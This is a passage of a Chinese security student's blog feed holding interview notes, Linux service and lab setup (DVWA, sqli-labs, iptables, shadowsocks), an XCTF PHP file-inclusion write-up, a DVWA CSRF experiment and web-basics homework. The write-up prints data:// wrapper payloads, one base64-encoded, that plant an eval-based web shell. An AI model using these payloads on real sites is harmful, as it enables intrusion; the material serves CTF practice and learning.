    <content><![CDATA[<h1 id="记20200815面试"><a href="#记20200815面试" class="headerlink" title="记20200815面试"></a>记20200815面试</h1><p>预先内容:<br>感谢某dalao的推荐,只是我搞砸了<br>面试岗位:网络安全服务(实习)<br>约定面试时间:20200815,14.00<br>到达位置时间:20200815,13.43</p>
<h3 id="心里状态"><a href="#心里状态" class="headerlink" title="心里状态:"></a>心里状态:</h3><pre><code>到现场之前,恩慌了一会,进去到现场等待面试的时候十分平静,不知道是慌到了极点还是什么,开始面试的时候整个人的状态处于未知,这次面试基本上状态完全是错误的,应以平常心去,每次说话前去思考一下是否存在问题.</code></pre>
<h3 id="问题要点"><a href="#问题要点" class="headerlink" title="问题要点"></a>问题要点</h3><pre><code>恩,先在这里感谢面试我的某dalao,没要他的话我应该更凉.</code></pre>
<h5 id="面试流程"><a href="#面试流程" class="headerlink" title="面试流程:"></a>面试流程:</h5><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">渗透测试的流程(给你一个域名你需要怎么做):</span><br><span class="line">这个应该是我答的最差的吧,心里是完全清楚流程过程的可是回答的一团糟</span><br><span class="line">1,信息搜集:</span><br><span class="line">    搜集域名信息(注册邮箱,子域名),通过邮箱收寻相关管理员信息,服务器版本信息(Win,limux),中间件版本信息,CMS指纹信息,通过GITHUB来寻找该网站是否开源</span><br><span class="line">2,基本测试:</span><br><span class="line">    扫描目录结构,判断信息传参点(sql注入测试,xss测试),通过管理员相关信息和弱口令来制作密码本尝试进行后台登录,对登录页面进行手工测试(是否可被穷举,是否存在信息遍历),对修改密码的页面进行手工(是否存在信息遍历,是否存在任意账户修改)</span><br><span class="line">2,深入测试:</span><br><span class="line">    寻找文件上传点进行测试,如果有源代码可以直接对源代码进行审计,读取数据包对cookies进行分析,是否存在文件包涵,通过CMS版本来测试以知漏洞(rec,sql等等)</span><br><span class="line"></span><br><span class="line">PHP data:</span><br><span class="line">    一种伪协议,对数据流进行封装,通常用来执行php代码(data://text/plain,一句话)</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>上面大概是自己复盘了一下,恩感觉还是有点乱,应该是我技术力不行吧(还有一些内容没写)</p>
<p>面试中还简单的问了一下python,恩没有细问也不做记录:</p>
<p>python我事先准备了一些,可是基本上没被问到:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Python 通常使用的发包库</span><br><span class="line">    urllib2</span><br><span class="line">    request</span><br><span class="line">    </span><br><span class="line">Python 正则表达:</span><br><span class="line">    re</span><br><span class="line">    </span><br><span class="line">Python的基本类型:</span><br><span class="line">    数字,字符串,元组,集合,列表,字典</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>写着写着有不知道写什么了就这样吧 </p>
<p>心态平和,遇事不慌,调整好心态  这应该才是我需要准备的东西</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200817 Linux-iptables端口转发</title>
    <url>/2020/08/17/20200817-Linux-iptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h1 id="20200817-Linux-iptables端口转发"><a href="#20200817-Linux-iptables端口转发" class="headerlink" title="20200817 Linux-iptables端口转发"></a>20200817 Linux-iptables端口转发</h1><p>iptables 转发端口<br>Centos6 10.10.10.4<br>KaliLinux 10.10.10.9</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 2333 -j DNAT --to-destination 10.10.10.9:80</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 10.10.10.9 --dport 80 -j SNAT --to-source 10.10.10.4</span><br><span class="line"></span><br><span class="line">service  iptables  save </span><br><span class="line"></span><br><span class="line">service  iptables  restart</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/08/17/6oYAp9NlMaBK8EV.png" alt="image.png"></p>
]]></content>
  </entry>
  <entry>
    <title>Linux-20200817-nginx反向代理</title>
    <url>/2020/08/17/Linux-20200817-nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h1><p>修改nginx.conf </p>
<p><img src="https://i.loli.net/2020/08/17/GPyg1tzMIJlBefq.png" alt="image.png"></p>
<p>重启nginx服务即可</p>
<p><img src="https://i.loli.net/2020/08/17/tQmjvycMrOFu6UI.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>20200818-Linux服务搭建与端口转发(nginx反向代理iptables端口转发)-ssserver搭建</title>
    <url>/2020/08/18/20200818-Linux%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86iptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-ssserver%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="20200818-Linux服务搭建与端口转发-nginx反向代理iptables端口转发-ssserver搭建"><a href="#20200818-Linux服务搭建与端口转发-nginx反向代理iptables端口转发-ssserver搭建" class="headerlink" title="20200818-Linux服务搭建与端口转发(nginx反向代理iptables端口转发),ssserver搭建"></a>20200818-Linux服务搭建与端口转发(nginx反向代理iptables端口转发),ssserver搭建</h1><h2 id="搭建WEB服务"><a href="#搭建WEB服务" class="headerlink" title="搭建WEB服务"></a>搭建WEB服务</h2><h3 id="搭建基本web服务器"><a href="#搭建基本web服务器" class="headerlink" title="搭建基本web服务器"></a>搭建基本web服务器</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install  mariadb mariadb-servrer php php-mysql httpd  mysql</span><br><span class="line"><span class="meta">#</span><span class="bash">安装基本服务</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/18/XwSd8UgmN7TI2aF.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl  restart httpd </span><br><span class="line">systemctl  restart  mariadb</span><br><span class="line"><span class="meta">#</span><span class="bash">启动httpd服务与mariadb服务</span></span><br><span class="line">firewall-cmd   --permanent  --add-port=80/tcp</span><br><span class="line">firewall-cmd   --reload</span><br><span class="line"><span class="meta">#</span><span class="bash">防火墙放行80端口,并重新载入配置</span></span><br></pre></td></tr></table></figure>

<p>WEB基本测试<br><img src="https://i.loli.net/2020/08/18/hgCnuq2ENFK46WQ.png" alt="image.png"></p>
<p>php基本测试:<br><img src="https://i.loli.net/2020/08/18/6aXuYZqO9pBQUDf.png" alt="image.png"></p>
<h3 id="搭建DVWA"><a href="#搭建DVWA" class="headerlink" title="搭建DVWA"></a>搭建DVWA</h3><p>下载并解压DVWA<br><img src="https://i.loli.net/2020/08/18/M4prdfaP6mcsntY.gif" alt="Peek 2020-08-18 17-18.gif"></p>
<p>配置dvwa数据库:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE DVWA;</span><br><span class="line"><span class="meta">#</span><span class="bash">创建数据库 DVWA</span></span><br><span class="line">create user dvwa@localhost identified by &#x27;password&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash">创建用户dvwa并设置密码password</span></span><br><span class="line">grant ALL on DVWA.* to dvwa@localhost;</span><br><span class="line"><span class="meta">#</span><span class="bash">分配用户权限为DVWA库的完整权限</span></span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta">#</span><span class="bash">刷新权限</span></span><br></pre></td></tr></table></figure>

<p>修改dvwa配置文件config.inc.php:</p>
<p><img src="https://i.loli.net/2020/08/18/OCESFoyQWBGUTps.png" alt="image.png"></p>
<p>基本完成:</p>
<p><img src="https://i.loli.net/2020/08/18/zGL63gsFTiASf9H.gif" alt="Peek 2020-08-18 18-06.gif"></p>
<h3 id="搭建sqli-labs"><a href="#搭建sqli-labs" class="headerlink" title="搭建sqli-labs"></a>搭建sqli-labs</h3><p>克隆文件到服务器:<br><img src="https://i.loli.net/2020/08/18/b3jTIaqwZvJB9se.gif" alt="sql.gif"><br>启动网页配置即可:<br><img src="https://i.loli.net/2020/08/18/2Uh5TxzbWNLePFG.gif" alt="sqlweb.gif"></p>
<h3 id="搭建wordpress"><a href="#搭建wordpress" class="headerlink" title="搭建wordpress"></a>搭建wordpress</h3><p>下载解压:<br><img src="https://i.loli.net/2020/08/18/Cp7yeKMxnEiAqlt.gif" alt="woe1.gif"></p>
<p>创建数据库:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE wp_db;</span><br><span class="line"><span class="meta">#</span><span class="bash">创建数据库 wp_db</span></span><br><span class="line">create user wpadmin@localhost identified by &#x27;password&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash">创建用户wpadmin并设置密码password</span></span><br><span class="line">grant ALL on wp_db.* to wpadmin@localhost;</span><br><span class="line"><span class="meta">#</span><span class="bash">分配用户权限为wp_db库的完整权限</span></span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta">#</span><span class="bash">刷新权限</span></span><br></pre></td></tr></table></figure>

<p>分配目录权限:<br><img src="https://i.loli.net/2020/08/18/toqBCSI16FxaJ2Y.gif" alt="Peek 2020-08-18 19-02.gif"></p>
<p>web配置:<br><img src="https://i.loli.net/2020/08/18/fDcxrW9QsjJ2azU.gif" alt="Peek 2020-08-18 19-25.gif"></p>
<h3 id="搭建phpcms"><a href="#搭建phpcms" class="headerlink" title="搭建phpcms"></a>搭建phpcms</h3><p>下载文件并解压:</p>
<p><img src="https://i.loli.net/2020/08/18/CARb2uDpVTSh8jd.gif" alt="Peek 2020-08-18 19-40.gif"></p>
<p>设置文件权限:<br><img src="https://i.loli.net/2020/08/18/bcXBrgWohdJpHn1.gif" alt="Peek 2020-08-18 19-56.gif"></p>
<p>创建数据库文件:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE phpcmsdb;</span><br><span class="line"><span class="meta">#</span><span class="bash">创建数据库 phpcmsdb</span></span><br><span class="line">create user phpcms@localhost identified by &#x27;password&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash">创建用户phpcms并设置密码password</span></span><br><span class="line">grant ALL on phpcmsdb.* to phpcms@localhost;</span><br><span class="line"><span class="meta">#</span><span class="bash">分配用户权限为phpcmsdb库的完整权限</span></span><br><span class="line">flush privileges;</span><br><span class="line"><span class="meta">#</span><span class="bash">刷新权限</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/18/drY4spzkm2WB19l.png" alt="image.png"></p>
<p>WEB设置安装<br><img src="https://i.loli.net/2020/08/18/MyD8ATGiKhV7flF.gif" alt="Peek 2020-08-18 20-28.gif"></p>
<p>创建指定缺失目录:<br><img src="https://i.loli.net/2020/08/18/3YGLOtj95baDm67.gif" alt="Peek 2020-08-18 20-13.gif"></p>
<p>结束</p>
<h4 id="检查WEB-Server-目录结构"><a href="#检查WEB-Server-目录结构" class="headerlink" title="检查WEB Server 目录结构"></a>检查WEB Server 目录结构</h4><p><img src="https://i.loli.net/2020/08/18/TthiSmjGegsFpLf.png" alt="image.png"></p>
<h2 id="nginx反向代理"><a href="#nginx反向代理" class="headerlink" title="nginx反向代理"></a>nginx反向代理</h2><p>对C7_3配置进行修改:<br>修改nginx.conf配置文件<br><img src="https://i.loli.net/2020/08/18/FwLP5Isqj1HGgC2.png" alt="image.png"><br>放行80端口<br><img src="https://i.loli.net/2020/08/18/SvzUYm9TuL6GXgw.png" alt="image.png"><br>测试:<br>    10.10.10.3 Web服务器<br>    10.10.10.7 nginx服务器<br><img src="https://i.loli.net/2020/08/18/bM8nYRvykjG7NhF.gif" alt="Peek 2020-08-18 21-03.gif"></p>
<h2 id="iptables-端口转发"><a href="#iptables-端口转发" class="headerlink" title="iptables 端口转发"></a>iptables 端口转发</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo net.ipv4.ip_forward=1 &gt;&gt; /etc/sysctl.conf</span><br><span class="line"><span class="meta">#</span><span class="bash">在这里我的命令死活有问题,最后是手动修改的配置文件(使用了sysctl -p加载但是加载的值一直为0)</span></span><br><span class="line"></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j DNAT --to-destination  10.10.10.3:80</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 10.10.10.3 --dport 80 -j SNAT --to-source 10.10.10.6</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/18/bEwPola3XrQIyFg.png" alt="image.png"></p>
<p>测试:<br>    Centos7 WEB server 10.10.10.3<br>    Centos6  iptables 10.10.10.6</p>
<p><img src="https://i.loli.net/2020/08/18/lPE1MJAsOtFvzpB.gif" alt="Peek 2020-08-18 23-23.gif"></p>
<h2 id="安装shadowsocks-python服务"><a href="#安装shadowsocks-python服务" class="headerlink" title="安装shadowsocks-python服务"></a>安装shadowsocks-python服务</h2><p>安装编译依赖环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install python-setuptools &amp;&amp; easy_install pip pip install shadowsocks</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/18/SYX7jVumKDT8WJx.gif" alt="Peek 2020-08-18 23-35.gif"><br>创建shadowsocks.json配置文件:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">    &quot;server&quot;:&quot;0.0.0.0&quot;,  </span><br><span class="line">    &quot;server_port&quot;:3300,  </span><br><span class="line">    &quot;local_port&quot;:1080,  </span><br><span class="line">    &quot;password&quot;:&quot;password&quot;,  </span><br><span class="line">    &quot;timeout&quot;:600,  </span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动服务:<br><img src="https://i.loli.net/2020/08/18/4v7ZDVANgetQrjW.gif" alt="Peek 2020-08-18 23-38.gif"><br>防火墙端口放行:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=3300/tcp</span><br><span class="line">firewall-cmd --permanent --add-port=3300/udp</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<p>访问测试(使用手机端访问了百度等网站):<br><img src="https://i.loli.net/2020/08/18/S2hCALsvO5YXu8b.gif" alt="Peek 2020-08-18 23-45.gif"></p>
]]></content>
      <tags>
        <tag>作业</tag>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200822-关于所思</title>
    <url>/2020/08/23/20200822-%E5%85%B3%E4%BA%8E%E6%89%80%E6%80%9D/</url>
    <content><![CDATA[<h1 id="20200822-关于所思"><a href="#20200822-关于所思" class="headerlink" title="20200822-关于所思"></a>20200822-关于所思</h1><h2 id="在此先感谢各位大哥的照顾"><a href="#在此先感谢各位大哥的照顾" class="headerlink" title="在此先感谢各位大哥的照顾"></a>在此先感谢各位大哥的照顾</h2><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><pre><code>划定阶段性的目标,对自己这个阶段性所学习的东西有一个输出(写出来记下来)
学习是一个从点到面,从面入点的过程,从自己可以接受的难度上手,从一个面慢慢的切入到点,再将点带入带面.最终对自己的所学进行记录总结.</code></pre>
<h3 id="自我学习"><a href="#自我学习" class="headerlink" title="自我学习"></a>自我学习</h3><pre><code>在学习中慢慢的总结出自己的缺点以及错误,更加明确的认识自己,改正自己.</code></pre>
<h3 id="有思考的话语"><a href="#有思考的话语" class="headerlink" title="有思考的话语"></a>有思考的话语</h3><pre><code>在对话过程中可自我思考一定时间,来保证自己的话语的无误性,和易懂性.</code></pre>
<h3 id="规划性"><a href="#规划性" class="headerlink" title="规划性"></a>规划性</h3><pre><code>规划自己,来避免可预计的意外</code></pre>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre><code>人外有人,无论自己做的怎么样,别飘,不配</code></pre>
<p>就写这么一点吧,心里有数才是最妥当的</p>
<p><em>思而不行则无用,行而不思则无功</em></p>
]]></content>
      <categories>
        <category>所思</category>
      </categories>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200825-Xctf-Web_php_include WP</title>
    <url>/2020/08/25/20200825-Xctf-Web-php-include-WP/</url>
    <content><![CDATA[<h1 id="20200825-Xctf-Web-php-include-WP"><a href="#20200825-Xctf-Web-php-include-WP" class="headerlink" title="20200825-Xctf-Web_php_include WP"></a>20200825-Xctf-Web_php_include WP</h1><h3 id="关于"><a href="#关于" class="headerlink" title="关于:"></a>关于:</h3><p>这个题来自与攻防世界,我自己好早以前就做过了,但是一直没有写一篇文章来记录他</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>php源代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">$page=$_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$page=$_GET[&#39;page&#39;];</code><br>#get一个参数<br><code>str_replace(&quot;php://&quot;, &quot;&quot;, $page);</code><br>#文本替换,区分大小写(将php://替换为空)<br><code>include($page)</code><br>#包含文件</p>
<p>这个个题有两个思路,一个是扫描网站目录.使用phpmyadmin登录进行数据库操作,或者使用php伪协议进行操作</p>
<p>1, phpmyadmin操作:<br><img src="https://raw.githubusercontent.com/sakuradied/data/master/img/2020-08-25_15-50.png" alt="img"><br>直接使用菜刀连接即可<br><img src="https://i.loli.net/2020/08/25/YE3jev5QISabWlt.png" alt="image.png"></p>
<p>这里写入到tmp目录,是因为tmp目录默认有任意读写权限的<br><img src="https://i.loli.net/2020/08/25/45FcApC6kgY1qPj.png" alt="image.png"></p>
<p>2, 伪协议的利用:<br>    <code>?page=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</code><br>    <code>?page=data://text/plain,&lt;?php%20@eval($_POST[%27shell%27]);%20?&gt;</code></p>
<p>使用菜刀链接即可</p>
<p>关于伪协议仍在查找资料学习中(官方的介绍只有用法和要求)</p>
<p><img src="https://i.loli.net/2020/08/25/n8WT4avKAEZwLmp.png" alt="image.png"></p>
<p>参考资料:</p>
<p>​    <a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
]]></content>
      <categories>
        <category>PHP</category>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200826-Html作业</title>
    <url>/2020/08/26/20200826-Html%E4%BD%9C%E4%B8%9A/</url>
    <content><![CDATA[<h1 id="20200826-Html作业"><a href="#20200826-Html作业" class="headerlink" title="20200826-Html作业"></a>20200826-Html作业</h1><h2 id="helloWorld"><a href="#helloWorld" class="headerlink" title="helloWorld:"></a>helloWorld:</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello_world<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是主标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是标题二<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是文章段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span>&gt;</span>这是a标签<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>成品页面:<br><img src="https://i.loli.net/2020/08/26/2Sp7EU5qHN4ndlV.png" alt="image.png"></p>
<p><code>&lt;!DOCTYPE html&gt;</code><br>#对浏览器声明这是一个html5页面<br><code>&lt;meta charset=&quot;utf-8&quot;&gt;</code><br>#规定 HTML 文档的字符编码为utf-8<br><code>&lt;title&gt;hello_world&lt;/title&gt;</code><br>#设置标题为htllo_world</p>
<h2 id="Css-form"><a href="#Css-form" class="headerlink" title="Css+form:"></a>Css+form:</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">            <span class="selector-class">.center</span> &#123;</span></span><br><span class="line">                margin: auto;</span><br><span class="line">                width: 25%;</span><br><span class="line"><span class="css">                <span class="selector-tag">border</span>: 3<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#73AD21</span>;</span></span><br><span class="line">                padding: 6px;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="css">            <span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="selector-tag">background-color</span>: <span class="selector-id">#4CAF50</span>;</span></span><br><span class="line">                border: none;</span><br><span class="line">                color: white;</span><br><span class="line">                padding: 7px 10px;</span><br><span class="line">                text-align: center;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">                display: inline-block;</span><br><span class="line">                font-size: 16px;</span><br><span class="line">                margin: 4px 2px;</span><br><span class="line">                cursor: pointer;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="css">            <span class="selector-class">.input</span> &#123;</span></span><br><span class="line">                width: 100%;</span><br><span class="line">                padding: 12px 20px;</span><br><span class="line">                margin: 8px 0;</span><br><span class="line">                display: inline-block;</span><br><span class="line"><span class="css">                <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ccc</span>;</span></span><br><span class="line">                border-radius: 4px;</span><br><span class="line">                box-sizing: border-box;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>UserName: <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input&quot;</span>  <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;确认&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>成品页面:<br><img src="https://i.loli.net/2020/08/26/K9Sr2p1vTPQGmVz.gif" alt="Peek 2020-08-26 15-49.gif"></p>
<h3 id="css属性"><a href="#css属性" class="headerlink" title="css属性:"></a>css属性:</h3><p><code>margin</code><br>#设置外边框距离<br><code>width</code><br>#设置元素宽度<br><code>border</code><br>#设置四个边框样式<br><code>padding</code><br>#设置元素内边距<br><code>background-color</code><br>#设置元素背景颜色<br><code>color</code><br>#设置文字颜色<br><code>text-align</code><br>#设置文本的对齐方式<br><code>text-decoration</code><br>#设置文本装饰<br><code>display</code><br>#属性规定元素应该生成的框的类型<br><code>box-sizing</code><br>#使用特定的方式匹配某个区域的特定元素</p>
<p>参考资料:<br><a href="https://www.w3school.com.cn/index.html">https://www.w3school.com.cn/index.html</a></p>
]]></content>
      <categories>
        <category>作业</category>
        <category>练习</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>Html</tag>
      </tags>
  </entry>
  <entry>
    <title>20200827-csrf-简单实验</title>
    <url>/2020/08/27/20200827-csrf-%E7%AE%80%E5%8D%95%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="20200827-csrf-简单实验"><a href="#20200827-csrf-简单实验" class="headerlink" title="20200827-csrf-简单实验"></a>20200827-csrf-简单实验</h1><p>写东西写着写着写到了csrf,发现以前用过,还害我看了半天,emmmm 鱼的记忆太难了</p>
<p>以下均为个人看解:</p>
<p>csrf 跨站伪造攻击:</p>
<pre><code>写点简单的,就是用户的请求地址没有受到校验,导致了用户请求任意一个网站都可以修改指定网站的用户数据</code></pre>
<p>大概是这样的:<br>    用户登录了网站A,网站A给用户下发了cookie或session,然后一不小心点了网站B的页面,网站B向网站A发了一个请求包(用户不知道),网站A没有对请求地址进行校验,执行了网站B的请求,(这个时候网站A就会认为是用户的操作而不是网站B的操作)</p>
<p>(其实请求地址校验是不靠谱的真正的解决方案应该是token+伪随机数校验)<br>(上面都是自己写了 没有参考文章  可能存在一些问题,当笑话看就好了)</p>
<p>一个简单的复现:<br>环境是 DVWA(Low):<br><img src="https://i.loli.net/2020/08/27/a5C1VDxiOcFbXT6.png" alt="image.png"></p>
<p>对发包数据包进行分析<br>请求地址:<br><a href="http://10.10.10.5/dvwa/vulnerabilities/csrf/">http://10.10.10.5/dvwa/vulnerabilities/csrf/</a>?<br>get参数:<br><code>password_new=admin&amp;password_conf=admin&amp;Change=Change</code></p>
<p>构建payload页面(我这里写的有点复杂但是无伤大雅)</p>
<p><img src="https://i.loli.net/2020/08/27/3Wol5pCLzh9VMSw.png" alt="image.png"></p>
<p>操作利用:<br><img src="https://i.loli.net/2020/08/27/uSmc918d2HpLJ7s.gif" alt="Peek 2020-08-27 15-17.gif"></p>
<p><strong>(其实完全可以写个js自动提交表单的,写成异步也可233333</strong></p>
]]></content>
      <categories>
        <category>学习</category>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>20200829- javascript断点调试</title>
    <url>/2020/08/29/20200829-javascript%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h1 id="20200829-javascript断点调试"><a href="#20200829-javascript断点调试" class="headerlink" title="20200829- javascript断点调试"></a>20200829- javascript断点调试</h1><p>使用Chrome浏览器F12进入开发者模式进行调试:<br><img src="https://i.loli.net/2020/08/29/mM5BiFXvuJfeAaV.png" alt="image.png"></p>
<p>在于调试没太多可记录的和C的debugger几乎是差不多的可能就是快捷键上有些差距:<br>F9 下一步(逐条)<br>F10 跨步 略过函数执行<br>F11 步入 依次到函数(等待执行,进入函数)<br>shift+F11 步出 跳到函数末端<br>F8 继续执行(直到下一个断点或者程序结束)</p>
<p>这边应该可以理解为寄存器区(区别还是挺大的)<br><img src="https://i.loli.net/2020/08/29/LecxrUG9uNPtKBQ.png" alt="image.png"></p>
<p>watch  显示任意表达式的值<br>call stack 显示嵌套的调用链<br>scope 显示当前的变量(local 局部变量 global全局变量)</p>
<p>简单操作演示:<br><img src="https://i.loli.net/2020/08/29/yLUF19X8Y6hOiIu.gif" alt="Peek 2020-08-29 14-29.gif"></p>
]]></content>
